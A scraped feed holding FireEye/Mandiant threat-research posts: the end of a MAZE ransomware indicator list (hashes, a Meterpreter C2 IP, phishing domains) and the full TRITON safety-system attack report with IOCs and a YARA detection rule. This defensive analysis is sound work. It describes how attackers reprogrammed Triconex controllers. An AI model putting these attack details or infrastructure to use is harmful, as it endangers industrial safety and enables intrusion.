<p>bad6fc87a98d1663be0df23aedaf1c62</p> </td> \n  </tr> \n  <tr> \n   <td width=\"200\" valign=\"top\"><p>Meterpreter C2s</p> </td> \n   <td width=\"424\" valign=\"top\"><p>5.199.167.188</p> </td> \n  </tr> \n  <tr> \n   <td width=\"200\" valign=\"top\"><p>Other Related Files</p> </td> \n   <td width=\"424\" valign=\"top\"><p>3A5A9D40D4592C344920DD082029B362 (related script)</p> <p>76f8f28bd51efa03ab992fdb050c8382 (MAZE execution artifact)</p> <p>b5aa49c1bf4179452a85862ade3ef317 (windows.bat kill script)&nbsp;</p> <p>fad3c6914d798e29a3fd8e415f1608f4 (related script)</p> </td> \n  </tr> \n  <tr> \n   <td width=\"200\" valign=\"top\"><p>Tools &amp; Utilities</p> </td> \n   <td width=\"424\" valign=\"top\"><p>27304b246c7d5b4e149124d5f93c5b01 (PsExec)</p> <p>42badc1d2f03a8b1e4875740d3d49336 (7zip)</p> <p>75b55bb34dac9d02740b9ad6b6820360 (PsExec)</p> <p>9b02dd2a1a15e94922be3f85129083ac (AdFind)</p> <p>c621a9f931e4ebf37dace74efcce11f2 (SMBTools)</p> <p>f413b4a2242bb60829c9a470eea4dfb6 (winRAR)&nbsp;</p> </td> \n  </tr> \n  <tr> \n   <td width=\"200\" valign=\"top\"><p>Email Sender Domains</p> </td> \n   <td width=\"424\" valign=\"top\"><p>att-customer[.]com</p> <p>att-information[.]com</p> <p>att-newsroom[.]com</p> <p>att-plans[.]com</p> <p>bezahlen-1und1[.]icu</p> <p>bzst-info[.]icu</p> <p>bzst-inform[.]icu</p> <p>bzstinfo[.]icu</p> <p>bzstinform[.]icu</p> <p>canada-post[.]icu</p> <p>canadapost-delivery[.]icu</p> <p>canadapost-tracking[.]icu</p> <p>hilfe-center-1und1[.]icu</p> <p>hilfe-center-internetag[.]icu</p> <p>trackweb-canadapost[.]icu</p> </td> \n  </tr> \n  <tr> \n   <td width=\"200\" valign=\"top\"><p>Sender Domain Registrant Addresses</p> </td> \n   <td width=\"424\" valign=\"top\"><p>abusereceive@hitler.rocks</p> <p>gladkoff1991@yandex.ru</p> </td> \n  </tr>\n </tbody>\n</table> \n<p>Mandiant Threat Intelligence will host an exclusive webinar on Thursday, May 21, 2020, at 8 a.m. PT / 11 a.m. ET to provide updated insight and information into the MAZE ransomware threat, and to answer questions from attendees.&nbsp;<a href=\"https://www.brighttalk.com/webcast/10469/408167\">Register today</a>&nbsp;to reserve your spot.</p>","descriptionType":"html","publishedDate":"Thu, 07 May 2020 23:00:00 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/maze/Picture1.png","linkMd5":"6485834713a8a07b55eee728c373c52e","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn39@2020_1/2020/08/24/14-11-05-062_e9aeb1a3c51df6c4.webp","destWidth":1798,"destHeight":844,"sourceBytes":389632,"destBytes":45200,"author":"Jeremy Kennelly","articleImgCdnMap":{"https://www.fireeye.com/content/dam/fireeye-www/blog/images/maze/Picture1.png":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn39@2020_1/2020/08/24/14-11-05-062_e9aeb1a3c51df6c4.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/maze/Picture2.png":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn84@2020_3/2020/08/24/14-11-10-808_c52a5dcac34512a5.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/maze/Picture3.png":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn59@2020_6/2020/08/24/14-11-11-408_fd4123a51c28d98c.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/maze/Picture4.png":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn69@2020_1/2020/08/24/14-11-12-622_37eccee0f0db70d0.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/maze/Picture5.png":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn57@2020_4/2020/08/24/14-11-13-845_d48e79e117bc6ab5.webp"},"publishedOrCreatedDate":1598278264226},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Attackers Deploy New ICS Attack Framework “TRITON” and Cause Operational\nDisruption to Critical Infrastructure","link":"http://www.fireeye.com/blog/threat-research/2017/12/attackers-deploy-new-ics-attack-framework-triton.html","description":"<h4>Introduction</h4> \n<p> <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/services.html\">Mandiant</a> recently responded to an incident at a critical infrastructure organization where an attacker deployed malware designed to manipulate industrial safety systems. The targeted systems provided emergency shutdown capability for industrial processes. We assess with moderate confidence that the attacker was developing the capability to cause physical damage and inadvertently shutdown operations. This malware, which we call TRITON, is an attack framework built to interact with Triconex Safety Instrumented System (SIS) controllers. We have not attributed the incident to a threat actor, though we believe the activity is consistent with a nation state preparing for an attack.</p> \n<p>TRITON is one of a limited number of publicly identified malicious software families targeted at <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/products/industrial-systems-and-critical-infrastructure-security.html\">industrial control systems (ICS)</a>. It follows <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/company/press-releases/2014/fireeye-reveals-rise-in-advanced-threat-activities-by-iranian-linked-ajax-security-team-in-post-stuxnet-era.html\">Stuxnet</a> which was used against Iran in 2010 and Industroyer which we believe was deployed by Sandworm Team against Ukraine in 2016. TRITON is consistent with these attacks, in that it could prevent safety mechanisms from executing their intended function, resulting in a physical consequence.</p> \n<table cellspacing=\"0\" cellpadding=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td width=\"90\"><p> <b>Malware Family</b></p> </td> \n   <td width=\"189\"><p> <b>Main Modules</b></p> </td> \n   <td width=\"189\"><p> <b>Description</b></p> </td> \n  </tr> \n  <tr> \n   <td rowspan=\"2\" width=\"90\"><p>TRITON</p> </td> \n   <td width=\"189\"><p>trilog.exe</p> </td> \n   <td width=\"189\"><p>Main executable leveraging libraries.zip</p> </td> \n  </tr> \n  <tr> \n   <td width=\"189\"><p>library.zip</p> </td> \n   <td width=\"189\"><p>Custom communication library for interaction with Triconex controllers.</p> </td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Table 1: Description of TRITON Malware</span></p> \n<h4>Incident Summary</h4> \n<p>The attacker gained remote access to an SIS engineering workstation and deployed the TRITON attack framework to reprogram the SIS controllers. During the incident, some SIS controllers entered a failed safe state, which automatically shutdown the industrial process and prompted the asset owner to initiate an investigation. The investigation found that the SIS controllers initiated a safe shutdown when application code between redundant processing units failed a validation check -- resulting in an MP diagnostic failure message.</p> \n<p>We assess with moderate confidence that the attacker inadvertently shutdown operations while developing the ability to cause physical damage for the following reasons:</p> \n<ul style=\"list-style-position: inside;\"> \n <li>Modifying the SIS could prevent it from functioning correctly, increasing the likelihood of a failure that would result in physical consequences.</li> \n <li>TRITON was used to modify application memory on SIS controllers in the environment, which could have led to a failed validation check.</li> \n <li>The failure occurred during the time period when TRITON was used.</li> \n <li>It is not likely that existing or external conditions, in isolation, caused a fault during the time of the incident.</li> \n</ul> \n<h4>Attribution</h4> \n<p> <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/index.html\">FireEye</a> has not connected this activity to any actor we currently track; however, we assess with moderate confidence that the actor is sponsored by a nation state. The targeting of critical infrastructure as well as the attacker’s persistence, lack of any clear monetary goal and the technical resources necessary to create the attack framework suggest a well-resourced nation state actor. &nbsp;Specifically, the following facts support this assessment:</p> \n<p>The attacker targeted the SIS suggesting an interest in causing a high-impact attack with physical consequences. This is an attack objective not typically seen from cyber-crime groups.</p> \n<p>The attacker deployed TRITON shortly after gaining access to the SIS system, indicating that they had pre-built and tested the tool which would require access to hardware and software that is not widely available. TRITON is also designed to communicate using the proprietary TriStation protocol which is not publicly documented suggesting the adversary independently reverse engineered this protocol.</p> \n<p>The targeting of critical infrastructure to disrupt, degrade, or destroy systems is consistent with numerous attack and reconnaissance activities carried out globally by Russian, Iranian, North Korean, U.S., and Israeli nation state actors. Intrusions of this nature do not necessarily indicate an immediate intent to disrupt targeted systems, and may be preparation for a contingency.</p> \n<h4>Background on Process Control and Safety Instrumented Systems</h4> \n<p> <br /> <span class=\"type-XS\">Figure 1: ICS Reference Architecture</span></p> \n<p>Modern industrial process control and automation systems rely on a variety of sophisticated control systems and safety functions. These systems and functions are often referred to as <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/products/industrial-systems-and-critical-infrastructure-security.html\">Industrial Control Systems (ICS)</a> or Operational Technology (OT).</p> \n<p>A Distributed Control System (DCS) provides human operators with the ability to remotely monitor and control an industrial process. It is a computerized control system consisting of computers, software applications and controllers. An Engineering Workstation is a computer used for configuration, maintenance and diagnostics of the control system applications and other control system equipment.</p> \n<p>A SIS is an autonomous control system that independently monitors the status of the process under control. If the process exceeds the parameters that define a hazardous state, the SIS attempts to bring the process back into a safe state or automatically performs a safe shutdown of the process. If the SIS and DCS controls fail, the final line of defense is the design of the industrial facility, which includes mechanical protections on equipment (e.g. rupture discs), physical alarms, emergency response procedures and other mechanisms to mitigate dangerous situations.</p> \n<p>Asset owners employ varied approaches to interface their plant's DCS with the SIS. The traditional approach relies on the principles of segregation for both communication infrastructures and control strategies. For at least the past decade, there has been a trend towards integrating DCS and SIS designs for various reasons including lower cost, ease of use, and benefits achieved from exchanging information between the DCS and SIS. We believe TRITON acutely demonstrates the risk associated with integrated designs that allow bi-directional communication between DCS and SIS network hosts.</p> \n<h4>Safety Instrumented Systems Threat Model and Attack Scenarios</h4> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/triton-ics/Fig2%20HR.png\" /> <br /> <span class=\"type-XS\">Figure 2: Temporal Relationship Between Cyber Security and Safety</span></p> \n<p>The attack lifecycle for disruptive attacks against ICS is similar to other types of cyber attacks, with a few key distinctions. First, the attacker’s mission is to disrupt an operational process rather than steal data. Second, the attacker must have performed OT reconnaissance and have sufficient specialized engineering knowledge to understand the industrial process being controlled and successfully manipulate it.</p> \n<p>Figure 2 represents the relationship between cyber security and safety controls in a process control environment. Even if cyber security measures fail, safety controls are designed to prevent physical damage. To maximize physical impact, a cyber attacker would also need to bypass safety controls.</p> \n<p>The SIS threat model below highlights some of the options available to an attacker who has successfully compromised an SIS.</p> \n<p> <i>Attack Option 1: Use the SIS to shutdown the process</i></p> \n<ul style=\"list-style-position: inside;\"> \n <li>The attacker can reprogram the SIS logic to cause it to trip and shutdown a process that is, in actuality, in a safe state. In other words, trigger a false positive.</li> \n <li>Implication: Financial losses due to process downtime and complex plant start up procedure after the shutdown.</li> \n</ul> \n<p> <i>Attack Option 2: Reprogram the SIS to allow an unsafe state</i></p> \n<ul style=\"list-style-position: inside;\"> \n <li>The attacker can reprogram the SIS logic to allow unsafe conditions to persist.</li> \n <li>Implication: Increased risk that a hazardous situation will cause physical consequences (e.g. impact to equipment, product, environment and human safety) due to a loss of SIS functionality.</li> \n</ul> \n<p> <i>Attack Option 3: Reprogram the SIS to allow an unsafe state – while using the DCS to create an unsafe state or hazard</i></p> \n<ul style=\"list-style-position: inside;\"> \n <li>The attacker can manipulate the process into an unsafe state from the DCS while preventing the SIS from functioning appropriately.</li> \n <li>Implication: Impact to human safety, the environment, or damage to equipment, the extent of which depends on the physical constraints of the process and the plant design.</li> \n</ul> \n<h4>Analysis of Attacker Intent</h4> \n<p>We assess with moderate confidence that the attacker’s long-term objective was to develop the capability to cause a physical consequence. We base this on the fact that the attacker initially obtained a reliable foothold on the DCS and could have developed the capability to manipulate the process or shutdown the plant, but instead proceeded to compromise the SIS system. Compromising both the DCS and SIS system would enable the attacker to develop and carry out an attack that causes the maximum amount of damage allowed by the physical and mechanical safeguards in place.</p> \n<p>Once on the SIS network, the attacker used their pre-built TRITON attack framework to interact with the SIS controllers using the TriStation protocol. The attacker could have caused a process shutdown by issuing a halt command or intentionally uploading flawed code to the SIS controller to cause it to fail. Instead, the attacker made several attempts over a period of time to develop and deliver functioning control logic for the SIS controllers in this target environment. While these attempts appear to have failed due one of the attack scripts’ conditional checks, the attacker persisted with their efforts. This suggests the attacker was intent on causing a specific outcome beyond a process shutdown.</p> \n<p>Of note, on several occasions, we have observed evidence of long term intrusions into ICS which were not ultimately used to disrupt or disable operations. For instance, Russian operators, such as Sandworm Team, have compromised Western ICS over a multi-year period without causing a disruption.</p> \n<h4>Summary of Malware Capabilities</h4> \n<p>The TRITON attack tool was built with a number of features, including the ability to read and write programs, read and write individual functions and query the state of the SIS controller. However, only some of these capabilities were leveraged in the trilog.exe sample (e.g. the attacker did not leverage all of TRITON’s extensive reconnaissance capabilities).</p> \n<p>The TRITON malware contained the capability to communicate with Triconex SIS controllers (e.g. send specific commands such as <i>halt </i>or read its memory content) and remotely reprogram them with an attacker-defined payload. The TRITON sample Mandiant analyzed added an attacker-provided program to the execution table of the Triconex controller. This sample left legitimate programs in place, expecting the controller to continue operating without a fault or exception. If the controller failed, TRITON would attempt to return it to a running state. If the controller did not recover within a defined time window, this sample would overwrite the malicious program with invalid data to cover its tracks.</p> \n<h4>Recommendations</h4> \n<p>Asset owners who wish to defend against the capabilities demonstrated in the incident, should consider the following controls:</p> \n<ul> \n <li>Where technically feasible, segregate safety system networks from process control and information system networks. Engineering workstations capable of programming SIS controllers should not be dual-homed to any other DCS process control or information system network.</li> \n <li>Leverage hardware features that provide for physical control of the ability to program safety controllers. These usually take the form of switches controlled by a physical key. On Triconex controllers, keys should not be left in the PROGRAM mode other than during scheduled programming events.</li> \n <li>Implement change management procedures for changes to key position. Audit current key state regularly.</li> \n <li>Use a unidirectional gateway rather than bidirectional network connections for any applications that depend on the data provided by the SIS.</li> \n <li>Implement strict access control and application whitelisting on any server or workstation endpoints that can reach the SIS system over TCP/IP.</li> \n <li>Monitor ICS network traffic for unexpected communication flows and other anomalous activity.</li> \n</ul> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/triton-ics/Fig3.png\" /> <br /> <span class=\"type-XS\">Figure 3: Triconex Key Switch (<a href=\"https://images-na.ssl-images-amazon.com/images/I/41jr93jKzML._SX466_.jpg\">source</a>)</span></p> \n<h4>Appendix: Technical Analysis</h4> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/triton-ics/Fig4%20HR.png\" /> <br /> <span class=\"type-XS\">Figure 4: TRITON Architecture and Attack Scenario</span></p> \n<p>TRITON was deployed on an SIS engineering workstation running the Microsoft Windows operating system. The malware was named to masquerade as the legitimate Triconex Trilog application. This application is used for reviewing logs and is a part of the TriStation application suite. The malware was delivered as a Py2EXE compiled python script dependent on a zip file containing standard Python libraries, open source libraries, as well as the attacker-developed Triconex attack framework for interacting with the Triconex controllers. Along with the executable, two binary files, <i>inject.bin (malicious function code)</i> and <i>imain.bin (malicious control logic)</i>, were deployed as the controller’s payload. These file names were hard coded in the Py2EXE compiled python script.</p> \n<p>Trilog.exe took one option from the command line, which was a single IP address of the target Triconex device. It did not leverage the underlying TRITON library’s capability for Triconex device discovery, instead an instance of trilog.exe had to be invoked separately for each target controller in the environment. Once invoked, trilog.exe checked the status of the controller, then read the configuration information exposed by the TriStation protocol. If the controller was in a running state, trilog.exe encoded the two payload files <i>inject.bin</i> and <i>imain.bin</i> and passed them to the communication libraries to be appended to the controller’s program memory and execution table.</p> \n<p>After payload files were inserted into memory on the Triconex controller, the script initiated a countdown, periodically checking the status of the controller. If an error was detected, the communication library’s method <i>SafeAppendProgramMod</i> attempted to reset the controller to the previous state using a TriStation protocol command. If this failed, trilog.exe attempted to write a small ‘dummy’ program to memory. We assess that this was an anti-forensics technique to hide the presence of the attacker code on the Triconex controller.</p> \n<p>Working with the asset owner, Mandiant ran trilog.exe in a lab environment with a valid Triconex controller and discovered a conditional check in the malware that prevented the payload binary from persisting in the environment. Mandiant confirmed that, after correcting patching the attack script to remove this check, the payload binary would persist in controller memory, and the controller would continue to run.</p> \n<p>TRITON implements the TriStation protocol, which is the protocol used by the legitimate TriStation application, to configure controllers.</p> \n<p> <i>TsHi<b> </b></i>is the high-level interface created by the malware’s authors that allows the threat actor’s operators to implement attack scripts using the TRITON framework. It exposes functions for both reconnaissance and attack. The functions generally accept binary data from the user, and handle the code ‘signing’ and check sums prior to passing the data to lower level libraries for serialization on to the network.</p> \n<p> <i>TsBase</i>, another attacker-written module,<i> </i>contains the functions called by <i>TsHi</i>, which translate the attacker’s intended action to the appropriate TriStation protocol function code. For certain functions, it also packs and pads the data in to the appropriate format.</p> \n<p> <i>TsLow</i> is an additional attacker module that implements the TriStation UDP wire protocol. The <i>TsBase</i> library primarily depends on the <i>ts_exec</i> method. This method takes the function code and expected response code, and serializes the commands payload over UDP. It checks the response from the controller against the expected value and returns a result data structure indicating success or a <i>False</i> object representing failure.</p> \n<p> <i>TsLow </i>also exposes the connect method used to check connectivity to the target controller. If invoked with no targets, it runs the device discovery function detect_ip. This leverages a \"ping\" message over the TriStation protocol using IP broadcast to find controllers that are reachable via a router from where the script is invoked.</p> \n<h4>Indicators</h4> \n<table cellspacing=\"0\" cellpadding=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td width=\"173\"><p> <b>Filename</b></p> </td> \n   <td width=\"197\" valign=\"top\"><p> <b>Hash</b></p> </td> \n  </tr> \n  <tr> \n   <td width=\"173\"><p>trilog.exe</p> </td> \n   <td width=\"197\">MD5: 6c39c3f4a08d3d78f2eb973a94bd7718<br /> SHA-256:<br /> e8542c07b2af63ee7e72ce5d97d91036c5da56e2b091aa2afe737b224305d230</td> \n  </tr> \n  <tr> \n   <td width=\"173\"><p>imain.bin</p> </td> \n   <td width=\"197\"><p>MD5: 437f135ba179959a580412e564d3107f<br /> SHA-256:<br /> 08c34c6ac9186b61d9f29a77ef5e618067e0bc9fe85cab1ad25dc6049c376949</p> </td> \n  </tr> \n  <tr> \n   <td width=\"173\"><p>inject.bin</p> </td> \n   <td width=\"197\"><p>MD5: 0544d425c7555dc4e9d76b571f31f500<br /> SHA-256:<br /> 5fc4b0076eac7aa7815302b0c3158076e3569086c4c6aa2f71cd258238440d14</p> </td> \n  </tr> \n  <tr> \n   <td width=\"173\"><p>library.zip</p> </td> \n   <td width=\"197\"><p>MD5: 0face841f7b2953e7c29c064d6886523<br /> SHA-256:<br /> bef59b9a3e00a14956e0cd4a1f3e7524448cbe5d3cc1295d95a15b83a3579c59</p> </td> \n  </tr> \n  <tr> \n   <td width=\"173\"><p>TS_cnames.pyc</p> </td> \n   <td width=\"197\"><p>MD5: e98f4f3505f05bf90e17554fbc97bba9<br /> SHA-256:<br /> 2c1d3d0a9c6f76726994b88589219cb8d9c39dd9924bc8d2d02bf41d955fe326</p> </td> \n  </tr> \n  <tr> \n   <td width=\"173\"><p>TsBase.pyc</p> </td> \n   <td width=\"197\"><p>MD5: 288166952f934146be172f6353e9a1f5<br /> SHA-256:<br /> 1a2ab4df156ccd685f795baee7df49f8e701f271d3e5676b507112e30ce03c42</p> </td> \n  </tr> \n  <tr> \n   <td width=\"173\"><p>TsHi.pyc</p> </td> \n   <td width=\"197\"><p>MD5: 27c69aa39024d21ea109cc9c9d944a04<br /> SHA-256:<br /> 758598370c3b84c6fbb452e3d7119f700f970ed566171e879d3cb41102154272</p> </td> \n  </tr> \n  <tr> \n   <td width=\"173\"><p>TsLow.pyc</p> </td> \n   <td width=\"197\"><p>MD5: f6b3a73c8c87506acda430671360ce15<br /> SHA-256:<br /> 5c776a33568f4c16fee7140c249c0d2b1e0798a96c7a01bfd2d5684e58c9bb32</p> </td> \n  </tr> \n  <tr> \n   <td width=\"173\"><p>sh.pyc</p> </td> \n   <td width=\"197\"><p>MD5: 8b675db417cc8b23f4c43f3de5c83438<br /> SHA-256:<br /> c96ed56bf7ee85a4398cc43a98b4db86d3da311c619f17c8540ae424ca6546e1</p> </td> \n  </tr>\n </tbody>\n</table> \n<h4>Detection</h4> \n<table cellspacing=\"0\" cellpadding=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td width=\"600\" valign=\"top\"><p>rule TRITON_ICS_FRAMEWORK<br /> {<br /> &nbsp; &nbsp; &nbsp; meta:<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; author = \"nicholas.carr @itsreallynick\"<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; md5 = \"0face841f7b2953e7c29c064d6886523\"<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; description = \"TRITON framework recovered during Mandiant ICS incident response\"<br /> &nbsp; &nbsp; &nbsp; strings:<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $python_compiled = \".pyc\" nocase ascii wide<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $python_module_01 = \"__module__\" nocase ascii wide<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $python_module_02 = \"&lt;module&gt;\" nocase ascii wide<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $python_script_01 = \"import Ts\" nocase ascii wide<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $python_script_02 = \"def ts_\" nocase ascii wide&nbsp;&nbsp;</p> <p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $py_cnames_01 = \"TS_cnames.py\" nocase ascii wide<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $py_cnames_02 = \"TRICON\" nocase ascii wide<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $py_cnames_03 = \"TriStation \" nocase ascii wide<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $py_cnames_04 = \" chassis \" nocase ascii wide&nbsp;&nbsp;</p> <p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $py_tslibs_01 = \"GetCpStatus\" nocase ascii wide<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $py_tslibs_02 = \"ts_\" ascii wide<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $py_tslibs_03 = \" sequence\" nocase ascii wide<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $py_tslibs_04 = /import Ts(Hi|Low|Base)[^:alpha:]/ nocase ascii wide<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $py_tslibs_05 = /module\\s?version/ nocase ascii wide<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $py_tslibs_06 = \"bad \" nocase ascii wide<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $py_tslibs_07 = \"prog_cnt\" nocase ascii wide&nbsp;&nbsp;</p> <p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $py_tsbase_01 = \"TsBase.py\" nocase ascii wide<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $py_tsbase_02 = \".TsBase(\" nocase ascii wide&nbsp;<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $py_tshi_01 = \"TsHi.py\" nocase ascii wide<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $py_tshi_02 = \"keystate\" nocase ascii wide<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $py_tshi_03 = \"GetProjectInfo\" nocase ascii wide<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $py_tshi_04 = \"GetProgramTable\" nocase ascii wide<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $py_tshi_05 = \"SafeAppendProgramMod\" nocase ascii wide<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $py_tshi_06 = \".TsHi(\" ascii nocase wide&nbsp;&nbsp;</p> <p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $py_tslow_01 = \"TsLow.py\" nocase ascii wide<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $py_tslow_02 = \"print_last_error\" ascii nocase wide<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $py_tslow_03 = \".TsLow(\" ascii nocase wide<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $py_tslow_04 = \"tcm_\" ascii wide<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $py_tslow_05 = \" TCM found\" nocase ascii wide&nbsp;&nbsp;</p> <p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $py_crc_01 = \"crc.pyc\" nocase ascii wide<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $py_crc_02 = \"CRC16_MODBUS\" ascii wide<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $py_crc_03 = \"Kotov Alaxander\" nocase ascii wide<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $py_crc_04 = \"CRC_CCITT_XMODEM\" ascii wide<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $py_crc_05 = \"crc16ret\" ascii wide<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $py_crc_06 = \"CRC16_CCITT_x1D0F\" ascii wide<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $py_crc_07 = /CRC16_CCITT[^_]/ ascii wide&nbsp;&nbsp;</p> <p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $py_sh_01 = \"sh.pyc\" nocase ascii wide&nbsp;&nbsp;</p> <p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $py_keyword_01 = \" FAILURE\" ascii wide<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $py_keyword_02 = \"symbol table\" nocase ascii wide&nbsp;&nbsp;</p> <p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $py_TRIDENT_01 = \"inject.bin\" ascii nocase wide<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $py_TRIDENT_02 = \"imain.bin\" ascii nocase wide&nbsp;&nbsp;</p> <p>&nbsp; &nbsp; &nbsp; condition:<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 2 of ($python_*) and 7 of ($py_*) and filesize &lt; 3MB<br /> }</p> </td> \n  </tr>\n </tbody>\n</table>","descriptionType":"html","publishedDate":"Thu, 14 Dec 2017 15:00:00 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/triton-ics/Fig2%20HR.png","linkMd5":"49d23fa3047b9cd1b3ff19e1c1ce2c8b","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx14/cdn35@2020_2/2020/08/24/14-11-05-414_e76a4cf8fb58ad5f.webp","destWidth":2496,"destHeight":1447,"sourceBytes":126555,"destBytes":74834,"author":"Blake Johnson","articleImgCdnMap":{"https://www.fireeye.com/content/dam/fireeye-www/blog/images/triton-ics/Fig2%20HR.png":"https://cdn.jsdelivr.net/gh/myreaderx14/cdn35@2020_2/2020/08/24/14-11-05-414_e76a4cf8fb58ad5f.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/triton-ics/Fig3.png":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn21@2020_6/2020/08/24/14-11-14-764_ec7c127a3d421389.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/triton-ics/Fig4%20HR.png":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn12@2020_6/2020/08/24/14-11-20-607_b6b2941ed7f19947.webp"},"publishedOrCreatedDate":1598278264217},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Separating the Signal from the Noise: How Mandiant Intelligence Rates\nVulnerabilities — Intelligence for Vulnerability Management, Part Three","link":"http://www.fireeye.com/blog/threat-research/2020/04/how-mandiant-intelligence-rates-vulnerabilities.html","description":"<p>\n  <i>One of the critical strategic and tactical roles that cyber threat\n    intelligence (CTI) plays is in the tracking, analysis, and\n    prioritization of software vulnerabilities that could potentially\n    put an organization’s data, employees and customers at risk. In this\n    four-part blog series, FireEye Mandiant Threat Intelligence\n    highlights the value of CTI in enabling vulnerability management,\n    and unveils new research into the latest threats, trends and recommendations.</i></p>\n <p>Every information security practitioner knows that patching\n  vulnerabilities is one of the first steps towards a healthy and\n  well-maintained organization. But with thousands of vulnerabilities\n  disclosed each year and media hype about the newest “branded”\n  vulnerability on the news, it’s hard to know where to start.</p>\n <p>The National Vulnerability Database (NVD) considers a range of\n  factors that are fed into an automated process to arrive at a <a\n  href=\"https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator\">score</a>\n  for CVSSv3. Mandiant Threat Intelligence takes a different approach,\n  drawing on the insight and experience of our analysts (Figure 1). This\n  human input allows for qualitative factors to be taken into\n  consideration, which gives additional focus to what matters to\n  security operations.</p>\n <p>\n  <img\n    src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/mandiantvulns/Picture1.png\" alt=\"\" />\n  <br /> <span class=\"type-XS\">Figure 1: How Mandiant Rates Vulnerabilities</span></p>\n <h4>Assisting Patch Prioritization</h4>\n <p>We believe our approach results in a score that is more useful for\n  determining patching priorities, as it allows for the adjustment of\n  ratings based on factors that are difficult to quantify using\n  automated means. It also significantly reduces the number of\n  vulnerabilities rated ‘high’ and ‘critical’ compared to CVSSv3 (Figure\n  2). We consider critical vulnerabilities to pose significant security\n  risks and strongly suggest that remediation steps are taken to address\n  them as soon as possible. We also believe that limiting ‘critical’ and\n  ‘high’ designations helps security teams to effectively focus\n  attention on the most dangerous vulnerabilities. For instance, from\n  2016-2019 Mandiant only rated two vulnerabilities as critical, while\n  NVD assigned 3,651 vulnerabilities a ‘critical’ rating (Figure 3).</p>\n <p>\n  <img\n    src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/mandiantvulns/Picture2.png\" alt=\"\" />\n  <br /> <span class=\"type-XS\">Figure 2: Criticality of US National\n    Vulnerability Database (NVD) CVSSv3 ratings 2016-2019 compared 